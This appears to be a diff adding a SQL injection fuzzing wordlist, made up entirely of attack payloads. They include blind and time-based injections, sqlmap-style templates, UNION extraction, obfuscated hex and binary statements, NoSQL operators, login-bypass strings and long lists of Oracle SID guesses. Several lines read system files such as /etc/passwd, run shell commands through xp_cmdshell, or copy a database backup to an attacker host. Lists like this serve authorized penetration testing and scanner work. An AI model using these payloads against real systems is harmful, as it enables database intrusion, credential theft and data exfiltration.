+and (select substring(@@version,2,1))='i'
+and (select substring(@@version,2,1))='y'
+and (select substring(@@version,3,1))='c'
+and (select substring(@@version,3,1))='S'
+and (select substring(@@version,3,1))='X'
+AND 0
+AND 1
+and 1 in (select var from temp)--
+AND 1083=1083 AND ('1427=1427
+AND 1083=1083 AND (1427=1427
+and 1=( if((load_file(char(110,46,101,120,11 ...
+AND 1=0
+AND 1=0 AND '%'='
+AND 1=0#
+AND 1=0--
+AND 1=1
+AND 1=1 AND '%'='
+AND 1=1#
+AND 1=1--
+AND 7300=7300 AND 'pKlZ'='pKlY
+AND 7300=7300 AND 'pKlZ'='pKlZ
+AND 7300=7300 AND ('pKlZ'='pKlY
+AND 7300=7300 AND ('pKlZ'='pKlZ
+AND 7506=9091 AND ('5913=5913
+AND 7506=9091 AND (5913=5913
+AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))
+AND [RANDNUM]=('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')
+AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')
+AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]')
+AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
+AND [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(1000000))
+AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+AND [RANDNUM]=[RANDNUM]
+AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)
+AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)
+AND [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')
+AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))
+AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
+AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
+AND [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')
+AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')
+AND CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END
+AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])
+AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
+AND ERROR(CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')) IS NOT NULL
+AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
+AND EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 0x3A END)
+AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
+AND false
+AND GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])
+AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--
+and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--
+AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
+AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])
+AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+AND SLEEP([SLEEPTIME])
+AND true
+AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
+and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+
+and+false%21=false--+
+and+if(1=2,1,SLEEP(5))--+
+and+if(true%21=true,1,SLEEP(5))--+
+and+true=false--+
+anything' OR 'x'='x
+anything' UNION SELECT 1,2,3--
+are @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+ARIS
+as
+AS INJECTX WHERE 1=1 AND 1=0
+AS INJECTX WHERE 1=1 AND 1=0#
+AS INJECTX WHERE 1=1 AND 1=0--
+AS INJECTX WHERE 1=1 AND 1=1
+AS INJECTX WHERE 1=1 AND 1=1#
+AS INJECTX WHERE 1=1 AND 1=1--
+asc
+ASDB
+ASDB0
+ASDB1
+ASDB2
+ASDB3
+ASDB4
+ASDB5
+ASDB6
+ASDB7
+ASDB8
+ASDB9
+ASG817
+ASG817P
+ASG817T
+ATRPROD
+ATRTEST
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;
+benchmark(10000000,MD5(1))#
+BENCHMARK(1000000000,MD5(CHAR(116)))
+bfilename
+BLA
+BUDGET
+C630
+case when name=0x5265696E657273 then 1 else 0 end
+char%4039%41%2b%40SELECT
+copy myfile from '/etc/passwd';
+create table myfile (input TEXT);
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp'" select * from myfile"--
+CTM4_0
+CTM4_1
+CTM4_6
+D
+D10
+D8
+D9
+DB
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+DB01
+DB02
+DB03
+DB1
+DB2
+DB2EDU
+DB2PROD
+DB2TEST
+DB3
+DBA
+DBA1
+DBA2
+DBA3
+DBA4
+DBA5
+DBA6
+DBA7
+DBA8
+DBA9
+DBMS_LOCK.SLEEP(50);
+DBX
+declare @q nvarchar (200) 0x730065006c00650063 ...
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @q nvarchar (200) select @q = 0x770061 ...
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @q nvarchar (4000) select @q =
+declare @s varchar (200) select @s = 0x73656c6 ...
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+declare @s varchar (8000) select @s = 0x73656c ...
+declare @s varchar(200) select @s = 0x77616974 ...
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+declare @s varchar(22) select @s =
+delete
+DEMO
+desc
+DEV
+DEV0
+DEV1
+DEV2
+DEV3
+DEV4
+DEV5
+DEV6
+DEV7
+DEV8
+DEV9
+DEVEL
+DIA1
+DIA2
+DIS
+distinct
+DWH
+DWHPROD
+DWHTEST
+DWRHS
+ELCARO
+ELT([RANDNUM]=[RANDNUM],[ORIGVALUE])
+ELT([RANDNUM]=[RANDNUM],[RANDNUM1])
+ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
+EMRS2
+EOF
+ESOR
+exec master..xp_cmdshell 'ipconfig+/all'
+exec master..xp_cmdshell 'net+users'
+exec master..xp_cmdshell 'net+view'
+exec master..xp_cmdshell 'ping+<attackerip>'
+exec sp
+exec xp
+exec(@s)
+EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
+FINDEC
+Finding the table name
+FINPROD
+FNDFS_HR1
+FNDFS_HR2
+FPRD
+GR01
+GR02
+GR03
+group by userid having 1=1--
+GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])
+handler
+having
+HAVING 1=0
+HAVING 1=0#
+HAVING 1=0--
+HAVING 1=1
+HAVING 1=1#
+HAVING 1=1--
+HAVING [RANDNUM]=[RANDNUM]
+hi or 1=1 --"
+hi or a=a
+hi' or 'a'='a
+hi' or 'x'='x';
+hi' or 1=1 --
+hi') or ('a'='a
+HR
+HR0
+HR1
+HR2
+HR3
+HR4
+HR5
+HR6
+HR7
+HR8
+HR9
+HRDMO
+IASDB
+if(1%21=1,1,SLEEP(5))--+
+if(2=2,1,SLEEP(5))--+
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/
+IF(SUBSTRING(USER(),1,4)=0x726f6f74,SLEEP(5),1)
+if(true=false,1,SLEEP(5))--+
+if(true=true,1,SLEEP(5))--+
+IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)
+IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0)
+INCD
+insert
+ISD01
+ISD06
+ISP01
+ITS
+IXOS
+JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
+KRAUS
+KRONOS
+LDAP
+like
+limit
+LINUX101
+LINUX1011
+LINUX1012
+LINUX1013
+LINUX1014
+LINUX102
+LINUX1021
+LINUX817
+LINUX8171
+LINUX8172
+LINUX8173
+LINUX8174
+LINUX901
+LINUX902
+LINUX9021
+LINUX9022
+LINUX9023
+LINUX9024
+LINUX9025
+LINUX9026
+LINUX9027
+LUN
+MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])
+MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])
+MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
+MDTEST
+MSAM
+MTIzJyBMSU1JVCAxLDEgVU5JT04gQUxMIFNFTEVDVCBDT05DQVQoMHgzYTc1N2E3OTNhLElGTlVMTChDQVNUKHZlcnNpb24oKSBBUyBDSEFSKSwweDIwKSwweDNhNzM2YTc2M2EpIw==
+MYDB
+NEDB
+nion/*aaa*/select/*aaa*/1,2,3
+NORTHWIND
+ODB
+OEMREP
+OGDP
+OID
+OJS
+OMS
+or
+or ''='
+or '1'='1
+or '1'='1'--
+or '7659'='7659
+or 'a'='a
+or 'something' = 'some'+'thing'
+or 'text' = n'text'
+or 'text' > 't'
+or 'unusual' = 'unusual'
+or 'whatever' in ('whatever')
+or (EXISTS)
+or 0=0 #
+or 0=0 #"
+or 0=0 --
+or 1 --'
+or 1 in (select @@version)--
+or 1/*
+OR 1=0
+OR 1=0#
+OR 1=0--
+OR 1=1
+or 1=1 --
+or 1=1 /*
+or 1=1 or ""=
+or 1=1 or ''='
+OR 1=1#
+OR 1=1--
+or 1=1/*
+or 2 > 1
+or 2 between 1 and 3
+OR 3409=3409 AND ('pytW' LIKE 'pytW
+OR 3409=3409 AND ('pytW' LIKE 'pytY
+or 3=3
+or a = a
+or a=a
+or a=a--
+or benchmark(10000000,MD5(1))#
+or isNULL(1/0) /*
+or pg_sleep(__TIME__)--
+or sleep(__TIME__)#
+or sleep(__TIME__)='
+or true--
+or username LIKE '%a%
+or username like char(37);
+OR x=x
+OR x=x#
+OR x=x--
+OR x=y
+OR x=y#
+OR x=y--
+or%201=1
+or%201=1 --
+ORA1
+ORA10
+ORA101
+ORA10101
+ORA10101P
+ORA10101T
+ORA10102
+ORA10102P
+ORA10102T
+ORA10103
+ORA10103P
+ORA10103T
+ORA10104
+ORA10104P
+ORA10104T
+ORA10105
+ORA10105P
+ORA10105T
+ORA1011
+ORA1011P
+ORA1011T
+ORA1012
+ORA1012P
+ORA1012T
+ORA1013
+ORA1013P
+ORA1013T
+ORA1014
+ORA1014P
+ORA1014T
+ORA1015
+ORA1015P
+ORA1015T
+ORA1021
+ORA1021P
+ORA1021T
+ORA1022
+ORA1022P
+ORA1022T
+ORA2
+ORA8
+ORA805
+ORA806
+ORA815
+ORA816
+ORA817
+ORA8170
+ORA8170P
+ORA8170T
+ORA8171
+ORA8171P
+ORA8171T
+ORA8172
+ORA8172P
+ORA8172T
+ORA8173
+ORA8173P
+ORA8173T
+ORA8174
+ORA8174P
+ORA8174T
+ORA8_SC
+ORA910
+ORA920
+ORA9201
+ORA9201P
+ORA9201T
+ORA9202
+ORA9202P
+ORA9202T
+ORA9203
+ORA9203P
+ORA9203T
+ORA9204
+ORA9204P
+ORA9204T
+ORA9205
+ORA9205P
+ORA9205T
+ORA9206
+ORA9206P
+ORA9206T
+ORA9207
+ORA9207P
+ORA9207T
+ORACL
+ORACLE
+ORADB
+ORADB1
+ORADB2
+ORADB3
+ORALIN
+ORCL
+ORCL0
+ORCL1
+ORCL10
+ORCL2
+ORCL3
+ORCL4
+ORCL5
+ORCL6
+ORCL7
+ORCL8
+ORCL9
+ORCLA
+ORCLB
+ORCLC
+ORCLD
+ORCLE
+ORCLF
+ORCLG
+ORCLH
+ORCLI
+ORCLJ
+ORCLK
+ORCLL
+ORCLM
+ORCLN
+ORCLO
+ORCLP
+ORCLP0
+ORCLP1
+ORCLP2
+ORCLP3
+ORCLP4
+ORCLP5
+ORCLP6
+ORCLP7
+ORCLP8
+ORCLP9
+ORCLQ
+ORCLR
+ORCLS
+ORCLSOL
+ORCLT
+ORCLU
+ORCLV
+ORCLW
+ORCLX
+ORCLY
+ORCLZ
+order by
+ORDER BY 1
+ORDER BY 1#
+ORDER BY 1--
+ORDER BY 10
+ORDER BY 10#
+ORDER BY 10--
+ORDER BY 11
+ORDER BY 11#
+ORDER BY 11--
+ORDER BY 12
+ORDER BY 12#
+ORDER BY 12--
+ORDER BY 13
+ORDER BY 13#
+ORDER BY 13--
+ORDER BY 14
+ORDER BY 14#
+ORDER BY 14--
+ORDER BY 15
+ORDER BY 15#
+ORDER BY 15--
+ORDER BY 16
+ORDER BY 16#
+ORDER BY 16--
+ORDER BY 17
+ORDER BY 17#
+ORDER BY 17--
+ORDER BY 18
+ORDER BY 18#
+ORDER BY 18--
+ORDER BY 19
+ORDER BY 19#
+ORDER BY 19--
+ORDER BY 2
+ORDER BY 2#
+ORDER BY 2--
+ORDER BY 20
+ORDER BY 20#
+ORDER BY 20--
+ORDER BY 21
+ORDER BY 21#
+ORDER BY 21--
+ORDER BY 22
+ORDER BY 22#
+ORDER BY 22--
+ORDER BY 23
+ORDER BY 23#
+ORDER BY 23--
+ORDER BY 24
+ORDER BY 24#
+ORDER BY 24--
+ORDER BY 25
+ORDER BY 25#
+ORDER BY 25--
+ORDER BY 26
+ORDER BY 26#
+ORDER BY 26--
+ORDER BY 27
+ORDER BY 27#
+ORDER BY 27--
+ORDER BY 28
+ORDER BY 28#
+ORDER BY 28--
+ORDER BY 29
+ORDER BY 29#
+ORDER BY 29--
+ORDER BY 3
+ORDER BY 3#
+ORDER BY 3--
+ORDER BY 30
+ORDER BY 30#
+ORDER BY 30--
+ORDER BY 31337
+ORDER BY 31337#
+ORDER BY 31337--
+ORDER BY 4
+ORDER BY 4#
+ORDER BY 4--
+ORDER BY 5
+ORDER BY 5#
+ORDER BY 5--
+ORDER BY 6
+ORDER BY 6#
+ORDER BY 6--
+ORDER BY 7
+ORDER BY 7#
+ORDER BY 7--
+ORDER BY 8
+ORDER BY 8#
+ORDER BY 8--
+ORDER BY 9
+ORDER BY 9#
+ORDER BY 9--
+ORIONDB
+ORTD
+P
+P10
+P10G
+P8
+P8I
+P9
+P9I
+password:*/=1--
+PD1
+PG_DELAY(50)
+pg_sleep(50)
+pg_sleep(__TIME__)--
+PINDB
+PORA10101
+PORA10102
+PORA10103
+PORA10104
+PORA10105
+PORA1011
+PORA1012
+PORA1013
+PORA1014
+PORA1015
+PORA1021
+PORA1022
+PORA8170
+PORA8171
+PORA8172
+PORA8173
+PORA8174
+PORA9201
+PORA9202
+PORA9203
+PORA9204
+PORA9205
+PORA9206
+PORA9207
+PRD
+PRINT
+PRINT @@variable
+PRITXI
+procedure
+PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)
+PROD
+PROD0
+PROD1
+PROD10G
+PROD2
+PROD3
+PROD4
+PROD5
+PROD6
+PROD7
+PROD8
+PROD8I
+PROD9
+PROD920
+PROD9I
+PROG10
+RAB1
+RAC
+RAC1
+RAC2
+RAC3
+RAC4
+RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')
+RECV
+REP
+REP0
+REP1
+REP2
+REP3
+REP4
+REP5
+REP6
+REP7
+REP8
+REP9
+replace
+REPO
+REPO0
+REPO1
+REPO2
+REPO3
+REPO4
+REPO5
+REPO6
+REPO7
+REPO8
+REPO9
+REPOS
+REPOS0
+REPOS1
+REPOS2
+REPOS3
+REPOS4
+REPOS5
+REPOS6
+REPOS7
+REPOS8
+REPOS9
+RIPPROD
+RITCTL
+RITDEV
+RITPROD
+RITQA
+RITTRN
+RITTST
+RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))
+RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
+RLIKE SLEEP([SLEEPTIME])
+root" #
+root" --
+root" or "1"="1
+root" or "1"="1"#
+root" or "1"="1"--
+root" or "1"="1"/*
+root" or 1=1
+root" or 1=1 or ""="
+root" or 1=1#
+root" or 1=1--
+root" or 1=1/*
+root") or "1"="1
+root") or "1"="1"#
+root") or "1"="1"--
+root") or "1"="1"/*
+root") or ("1"="1
+root") or ("1"="1"#
+root") or ("1"="1"--
+root") or ("1"="1"/*
+root"/*
+root' #
+root' --
+root' or '1'='1
+root' or '1'='1'#
+root' or '1'='1'--
+root' or '1'='1'/*
+root' or 1=1
+root' or 1=1#
+root' or 1=1--
+root' or 1=1/*
+root') or '1'='1
+root') or '1'='1'#
+root') or '1'='1'--
+root') or '1'='1'/*
+root') or ('1'='1
+root') or ('1'='1'#
+root') or ('1'='1'--
+root') or ('1'='1'/*
+root'/*
+root'or 1=1 or ''='
+SA0
+SA1
+SA2
+SA3
+SA4
+SA5
+SA6
+SA7
+SA8
+SA9
+SAA
+SAB
+SAC
+SAD
+SAE
+SAF
+SAG
+SAH
+SAI
+SAJ
+SAK
+SAL
+SALES
+SAM
+SAMPLE
+SAN
+SANIPSP
+SAO
+SAP
+SAP0
+SAP1
+SAP2
+SAP3
+SAP4
+SAP5
+SAP6
+SAP7
+SAP8
+SAP9
+SAPHR
+SAQ
+SAR
+SAS
+SAT
+SAU
+SAV
+SAW
+SAX
+SAY
+SAZ
+select
+SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' FROM RDB$DATABASE
+SELECT '[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)||'[DELIMITER_STOP]'
+select * from information_schema.tables--
+select * from master..sysserverse
+select * from myfile;copy myfile to /tmp/test;
+select * from pg_group;
+select * from pg_shadow;
+select * from syscat.dbauth where grantee = current user;
+select * from syscat.tabauth where grantee = current user;
+select * from syscat.tabauth;
+select * from sysusers
+select @@microsoftversione
+select @@servernamee
+select @@version
+select current server from sysibm.sysdummy1;
+select current_database();
+select current_setting('config_file');
+select current_setting('data_directory');
+select current_setting('hba_file');
+select current_setting('krb_server_keyfile');
+select current_setting('log_connections');
+select current_setting('log_statement');
+select current_setting('password_encryption');
+select current_setting('port');
+select current_setting('virtual_host');
+select current_user;
+select grantee from syscat.dbauth;
+select name from syscolumns where id = (sele ...
+select name from sysibm.systables;
+select name, tbname, coltype from sysibm.syscolumns;
+SELECT schemaname FROM syscat.schemata;
+select session_user from sysibm.sysdummy1;
+select session_user;
+select system_user from sysibm.sysdummy1;
+select user from sysibm.sysdummy1;
+select version();
+select versionnumber, version_timestamp from sysibm.sysversions;
+SET @c = CONCAT(_latin1 b'01010011',_latin1 b'01100101',_latin1 b'01001100',_latin1 b'01100101',_latin1 b'01100011',_latin1 b'01110100',' ',_latin1 b'00110001');PREPARE s FROM @c;EXECUTE s;
+SET @c = CONCAT(b'01010011',b'01100101',b'01001100',b'01100101',b'01100011',b'01110100',' ',b'00110001');PREPARE s FROM @c;EXECUTE s;
+SET @c = CONCAT(REPLACE(MAKE_SET(5,'SEL','xxxxx','ECT'), ',', ''),' 1');PREPARE s FROM @c;EXECUTE s;
+SGNT
+SID0
+SID1
+SID2
+SID3
+SID4
+SID5
+SID6
+SID7
+SID8
+SID9
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
+SLEEP(5) /*' or '%2b(sleep(5))%2b'" or "%2b(sleep(5))%2b"*/
+SLEEP(50)
+sleep(__TIME__)#
+sqlvuln
+sqlvuln;
+STAG1
+STAG2
+superbug 'or''='
+superbug' AND 'a'='a
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+T1
+T10
+T101
+T102
+T2
+T3
+T4
+T7
+T71
+T72
+T73
+T8
+T80
+T81
+T82
+T9
+T91
+T92
+TEST
+test' OR '1'='1
+TEST10G
+THUMPER
+Time-Based:
+to_timestamp_tz
+TRC28
+TRIUMF
+true, $where: '1 == 1'
+truncate
+TSH1
+TST
+TST0
+TST1
+TST2
+TST3
+TST4
+TST5
+TST6
+TST7
+TST8
+TST9
+TYCP
+tz_offset
+uni/**/on sel/**/ect
+UNION ALL SELECT
+union all select @@version--
+UNION SELECT
+union select * from users where login = char ...
+union select 1,load_file('/etc/passwd'),1,1,1;
+union(select(version()))
+union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+
+UNIX101
+UNIX1011
+UNIX1012
+UNIX1013
+UNIX1014
+UNIX102
+UNIX1021
+UNIX817
+UNIX8171
+UNIX8172
+UNIX8173
+UNIX8174
+UNIX901
+UNIX902
+UNIX9021
+UNIX9022
+UNIX9023
+UNIX9024
+UNIX9025
+UNIX9026
+UNIX9027
+update
+VENOM
+VENU
+VISTA
+W101
+W1011
+W1012
+W1013
+W1014
+W102
+W1021
+W817
+W8171
+W8172
+W8173
+W8174
+W901
+W902
+W9021
+W9022
+W9023
+W9024
+W9025
+W9026
+W9027
+WAITFOR DELAY '0:0:50';--"
+WAITFOR DELAY '0:0:[SLEEPTIME]'
+WG73
+WHERE 1=1 AND 1=0
+WHERE 1=1 AND 1=0#
+WHERE 1=1 AND 1=0--
+WHERE 1=1 AND 1=1
+WHERE 1=1 AND 1=1#
+WHERE 1=1 AND 1=1--
+WIN101
+WIN1011
+WIN1012
+WIN1013
+WIN1014
+WIN102
+WIN1021
+WIN817
+WIN8171
+WIN8172
+WIN8173
+WIN8174
+WIN901
+WIN902
+WIN9021
+WIN9022
+WIN9023
+WIN9024
+WIN9025
+WIN9026
+WIN9027
+WINDOWS101
+WINDOWS1011
+WINDOWS1012
+WINDOWS1013
+WINDOWS1014
+WINDOWS102
+WINDOWS1021
+WINDOWS817
+WINDOWS8171
+WINDOWS8172
+WINDOWS8173
+WINDOWS8174
+WINDOWS901
+WINDOWS902
+WINDOWS9021
+WINDOWS9022
+WINDOWS9023
+WINDOWS9024
+WINDOWS9025
+WINDOWS9026
+WINDOWS9027
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND 1=(SELECT COUNT(*) FROM tabname);--
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+x' or 1=1 or 'x'='y
+x' OR full_name LIKE '%Bob%
+x';INSERT+INTO+aa('1')+values('1')--
+x';UPDATE+aa+set+1='2'--
+XE
+XE_XPT
+XEXDB
+{ $ne: 1 }
+{"$gt": ""}
+{$gt: ''}
+{$nin: [""]}}
+|
+||		(double pipe) concatenate
+|| 1==1
+||'6
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+||UTL_HTTP.REQUEST
+â or 1=1 --
+â or 3=3 --
+Ã½ or 1=1 --
+‘ or 1=1 --
+‘ or 3=3 --
+’ or ‘1’=’1
